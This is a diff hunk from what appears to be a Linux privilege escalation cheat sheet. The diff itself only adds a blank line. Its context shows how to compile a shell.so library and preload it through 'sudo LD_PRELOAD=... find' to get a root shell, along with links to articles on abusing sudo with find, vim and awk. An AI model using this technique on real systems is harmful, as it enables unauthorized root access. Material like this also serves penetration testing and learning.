@@ -39,4 +39,5 @@ gcc -fPIC -shared -o shell.so shell.c -nostartfile
 sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
 ```
 **Linux Privilege Escalation exploiting Sudo Rights — Part I** - https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d
+
 **Abusing 'find', 'vim' and 'awk' for root access** - https://www.andreafortuna.org/2018/05/16/exploiting-sudo-for-linux-privilege-escalation/
